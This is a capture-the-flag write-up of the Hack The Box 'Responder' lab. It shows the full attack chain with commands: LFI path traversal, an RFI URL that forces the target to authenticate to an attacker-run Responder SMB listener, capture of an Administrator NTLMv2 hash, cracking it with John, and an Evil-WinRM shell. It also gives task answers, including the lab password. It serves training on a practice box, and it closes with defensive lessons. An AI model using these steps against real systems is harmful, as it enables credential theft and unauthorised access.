# Hack The Box: Responder Writeup — Very Easy

> **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** LFI, RFI, NTLM, Hash Cracking, Evil-WinRM, Windows

Another day, another box! Today we're exploiting a Remote File Include vulnerability to steal NTLM credentials using Responder, cracking the hash with John The Ripper, and getting a shell via Evil-WinRM 😄 Let's dive in 🚀

---

## What is Responder?

Responder is a Very Easy machine from Hack The Box Starting Point Tier 1. It covers Local File Inclusion (LFI), Remote File Inclusion (RFI), NTLM hash capturing using the Responder tool, hash cracking with John The Ripper, and remote access via Evil-WinRM.

**Skills covered:**
- Network reconnaissance with Nmap
- Local File Inclusion (LFI) exploitation
- Capturing NTLM hashes with Responder
- Hash cracking with John The Ripper
- Remote shell access with Evil-WinRM

---

## Setting Up

Connect to the HTB network using your OpenVPN config file:

```bash
sudo openvpn your-htb-vpn-file.ovpn
```

Spawn the Responder machine. My target IP was `10.129.107.48`.

<img width="1387" height="105" alt="machine IP" src="https://github.com/user-attachments/assets/9c0fd42f-b9e5-47a2-a038-0576a6ace861" />

---

## Step 1 — Ping the Target

Confirm the machine is reachable:

```bash
ping -c 4 10.129.107.48
```

All 4 packets returned with 0% packet loss. Target is alive. ✅

<img width="524" height="173" alt="ping check" src="https://github.com/user-attachments/assets/c622a68d-7863-416f-b071-651ef5be20a0" />

---

## Step 2 — Nmap Scan

Run a full service version scan:

```bash
nmap -sVC -T4 10.129.107.48
```

<img width="795" height="266" alt="nmap  scan" src="https://github.com/user-attachments/assets/c1fe3d43-9752-4b91-a187-a51cdcb43ba9" />


Two open ports:
- **Port 80** — Apache web server running PHP on Windows
- **Port 5985** — WinRM (Windows Remote Management) — this is what we'll use later to get a shell

---

## Step 3 — Web Enumeration

Visit `http://10.129.107.48` in the browser. The site redirects us to `unika.htb`.

To make this work, add it to your `/etc/hosts` file:

<img width="507" height="187" alt="etc host" src="https://github.com/user-attachments/assets/1a0e253f-62b1-41aa-b7cd-ea6c3986c689" />

```bash
echo "10.129.107.48 unika.htb" | sudo tee -a /etc/hosts
```

Now visit `http://unika.htb`.

Looking at the URL when switching languages, we can see a `page` parameter being used:

<img width="1910" height="982" alt="web page 1" src="https://github.com/user-attachments/assets/6074c946-938a-4025-96a2-f307bfa3a938" />

```
http://unika.htb/index.php?page=french.html
```

---

## Step 4 — Local File Inclusion (LFI) & Remote File Inclusion (RFI)

The `page` parameter loads files directly — this is a classic **Local File Inclusion** vulnerability. We can test it by trying to read a Windows system file:

```
http://unika.htb/?page=../../../../../../../../windows/system32/drivers/etc/hosts
```
<img width="1919" height="591" alt="web page 2" src="https://github.com/user-attachments/assets/7ef78ccb-7e5d-4e79-94c7-0989c0af0fd9" />

For **Remote File Inclusion (RFI)**, we can point the parameter to a file on our own machine.

```
//10.10.14.6/somefile
```

We will use RFI to force the Windows machine to authenticate to our machine — and capture its NTLM hash using Responder.

---

## Step 5 — Find Your VPN IP

Before running Responder, find your tun0 (VPN) interface IP:

```bash
ip a
```

<img width="979" height="411" alt="ip info" src="https://github.com/user-attachments/assets/e9e9e2f7-76bd-4dbe-9b10-96adb65dd70d" />


My tun0 IP was `10.10.16.123`. This is the IP we'll use with Responder.

---

## Step 6 — Start Responder

NTLM is Windows' challenge-response authentication protocol. When we point the RFI to our machine, Windows tries to authenticate using NTLM, and Responder captures that hash.

First check the Responder interface flag:

```bash
responder -h | grep interface
```

<img width="573" height="76" alt="responder help" src="https://github.com/user-attachments/assets/718f6763-0154-404c-841a-4ad7c14cb9ca" />


Now run Responder on the tun0 interface:

```bash
sudo responder -I tun0 -v
```

<img width="475" height="107" alt="responder command" src="https://github.com/user-attachments/assets/c70ebf66-06a4-4b65-a8fb-16b8052b7faa" />

---

## Step 7 — Trigger the NTLM Capture

With Responder listening, trigger the RFI by visiting this URL in the browser (replace with your tun0 IP):

```
http://unika.htb/?page=//10.10.16.123/somefile
```
<img width="1609" height="506" alt="web page 3" src="https://github.com/user-attachments/assets/61f444ba-aa91-42eb-aa2f-81f76b1cd99f" />

Windows tries to authenticate to our fake SMB server and Responder captures the NTLMv2 hash!

<img width="1906" height="427" alt="responder response" src="https://github.com/user-attachments/assets/d247150d-494e-43a5-b99d-b0081a583ca6" />

```
[SMB] NTLMv2-SSP Username : Administrator
[SMB] NTLMv2-SSP Hash    : Administrator::RESPONDER:5b7ca5ac9b214f5a:...
```

---

## Step 8 — Save the Hash

Copy the full hash into a file:

```bash
echo "Administrator::RESPONDER:..." > admin.hash
```

<img width="1904" height="72" alt="copy hash into file" src="https://github.com/user-attachments/assets/cb772ed5-9662-430f-85c8-ec7fbe332ba4" />

---

## Step 9 — Crack the Hash with John The Ripper

The tool used to crack NetNTLMv2 hashes is **John The Ripper** (Task 8):

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
```
<img width="801" height="150" alt="crack the hash" src="https://github.com/user-attachments/assets/570415f6-bf4e-4892-b717-a6d103fccd10" />


---

## Step 10 — Remote Shell with Evil-WinRM

Now use Evil-WinRM to connect to port 5985 with the cracked credentials:

```bash
sudo evil-winrm -u Administrator -p badminton -i 10.129.107.48
```

We're in! Navigate to find the flag.

```powershell
cd C:\Users\mike\Desktop
cat flag.txt
```

<img width="1082" height="853" alt="evil winrm output" src="https://github.com/user-attachments/assets/3ba4dba3-0e9a-4345-9c1f-bcdf374d9776" />

---


## Task Answers

**Task 1 — What domain does the IP redirect to?**
`unika.htb`

**Task 2 — What scripting language is used on the server?**
`PHP`

**Task 3 — What URL parameter loads different language versions?**
`page`

**Task 4 — Which value is an example of LFI exploitation?**
`../../../../../../../../windows/system32/drivers/etc/hosts`

**Task 5 — Which value is an example of RFI exploitation?**
`//10.10.14.6/somefile`

**Task 6 — What does NTLM stand for?**
`New Technology LAN Manager`

**Task 7 — Which Responder flag specifies the network interface?**
`-I`

**Task 8 — What is the full name of the hash cracking tool john?**
`John The Ripper`

**Task 9 — What is the administrator password?**
`badminton`

**Task 10 — What port does WinRM listen on?**
`5985`

**Task 11 — On which user's desktop is the flag?**
`mike`

---

## What I Learned

Responder shows a powerful attack chain — from a simple LFI vulnerability all the way to a full Windows shell. Key takeaways:

- **Never allow user input to control file paths** — LFI and RFI can lead to credential theft
- **Disable NTLM authentication** where possible and use Kerberos instead
- **Use strong passwords** — `badminton` was cracked in seconds with rockyou.txt
- **Restrict WinRM access** to trusted IPs only using firewall rules

---

*Written by [Tharindu Pathmasiri](https://github.com/tharindu-L) — IT Undergraduate | Cybersecurity Enthusiast*
